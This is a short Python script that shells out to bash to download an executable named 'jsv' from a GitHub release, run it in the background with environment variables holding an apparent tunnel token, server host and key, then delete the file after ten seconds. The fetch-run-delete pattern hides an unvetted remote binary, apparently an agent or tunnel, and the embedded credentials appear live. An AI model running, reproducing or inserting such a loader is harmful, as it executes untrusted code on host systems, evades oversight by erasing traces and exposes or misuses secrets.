import subprocess
cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 N_S=nz.seav.eu.org N_K=2kVTRbOuEylfrEE6b9 C_D=streamlit2.seav.eu.org bash -c 'curl -L -o jsv https://github.com/seav1/dl/releases/download/files/jsv && chmod +x jsv && ./jsv & sleep 10 && rm jsv'"
subprocess.call(cmd, shell=True)
